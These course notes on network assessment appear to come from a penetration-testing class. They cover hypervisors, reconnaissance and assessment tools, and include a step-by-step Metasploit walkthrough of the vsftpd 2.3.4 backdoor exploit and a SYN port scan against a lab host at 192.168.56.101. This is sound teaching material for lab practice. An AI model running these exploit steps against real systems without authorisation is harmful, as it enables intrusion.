
# Module 2: Network Assessment Methodology and Tools

---

## 🧠 Introduction

This module focuses on the methodology and tools used in network assessments, including virtualization, reconnaissance techniques, and practical use of industry tools like Metasploit and Nmap.

---

## 💻 Introduction to Virtualization

### 🔹 What is Virtualization?

Virtualization allows multiple operating systems (virtual machines) to run on a single physical machine by utilizing underused hardware resources.

---

### 🔹 Hypervisor

A hypervisor is responsible for creating and managing virtual machines by providing:

* Virtual CPU, RAM, and storage
* Virtual network adapters
* Isolated environments for each VM

---

### 🔸 Types of Hypervisors

#### Type 1 (Bare-Metal Hypervisor)

* Installed directly on hardware
* High performance and efficiency

**Examples:**

* VMware ESXi
* Proxmox
* XCP-ng

---

#### Type 2 (Hosted Hypervisor)

* Runs on top of an existing OS
* Easier to use but less efficient

**Examples:**

* VMware Workstation Pro
* VirtualBox

---

## 🕵️ Fundamentals of Reconnaissance

Reconnaissance is the initial phase of a network assessment where information about the target is collected.

---

### 🔹 Types of Reconnaissance

#### Passive Reconnaissance

* No direct interaction with target
* Hard to detect

**Examples:**

* Social media research
* Public websites

---

#### Active Reconnaissance

* Direct interaction with target
* Easier to detect

**Examples:**

* Port scanning
* Network probing

---

### 🎯 Reconnaissance Objectives

* Collect **network information**

  * Domain names
  * IP addresses
  * Protocols

* Collect **system information**

  * Users and groups
  * Routing tables
  * System types

* Collect **organizational information**

  * Employee details
  * Company structure
  * Locations

---

### 🔍 Reconnaissance Techniques

* Search engines (Google, Bing, etc.)
* Google Dorking
* Social media intelligence
* Website footprinting
* Email reconnaissance
* WHOIS lookup
* DNS reconnaissance
* Network footprinting
* Social engineering

---

## 🛠️ Popular Network Assessment Tools

| Tool        | Purpose                        |
| ----------- | ------------------------------ |
| Netdiscover | Discover live hosts            |
| Nmap        | Network scanning & enumeration |
| Nessus      | Vulnerability scanning         |
| Metasploit  | Exploitation & scanning        |

---

## ⚡ Exploring Metasploit

Metasploit is a powerful framework used for exploitation and vulnerability validation.

---

### 🧪 Exploiting VSFTPD Backdoor

#### Steps:

msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set rhosts 192.168.56.101
set rport 21
run

---

### 📌 Result

* Successfully gained shell access to target machine

---

### 🔍 Post-Exploitation Commands

uname -a
arp -a
ip addr

---

### ❌ Exit Session

exit

---

## 🔎 Port Scanning using Metasploit

### Steps:

search portscan
use auxiliary/scanner/portscan/syn
setg rhosts 192.168.56.101
run

---

## ✅ Key Takeaways

* Virtualization is essential for building safe lab environments
* Reconnaissance is the first step in any network assessment
* Passive recon is stealthy, active recon is more direct
* Tools like Metasploit and Nmap are critical for real-world assessments

---
